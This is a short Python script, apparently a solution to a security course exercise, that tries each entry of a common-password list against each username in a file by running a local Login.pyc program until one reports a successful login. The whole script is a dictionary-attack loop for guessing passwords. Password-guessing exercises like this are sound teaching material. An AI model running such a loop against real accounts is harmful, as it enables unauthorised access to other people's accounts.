import sys
import datetime
import subprocess

now = datetime.datetime.now()

# file opening
with open('../Q2/gang', 'r') as file:
    usernames = file.read().splitlines()

with open('../Q2/MostCommonPWs', 'r') as file:
    candidates = file.read().splitlines()

usernames.remove("SkyRedFalcon914")

username = ''
password = ''

for name in usernames:
    for candidate in candidates:
        result = subprocess.run(['python3', '../Q2/Login.pyc', name, candidate], capture_output=True, text=True)
        print(f"User: {name} Pass: {candidate}")
        
        if result.stdout=='Login successful.\n':
            username = name
            password = candidate
            break
    if username != '':
        break

print(now)
print(f"User: {username}, Pass: {password}")
print(datetime.datetime.now())
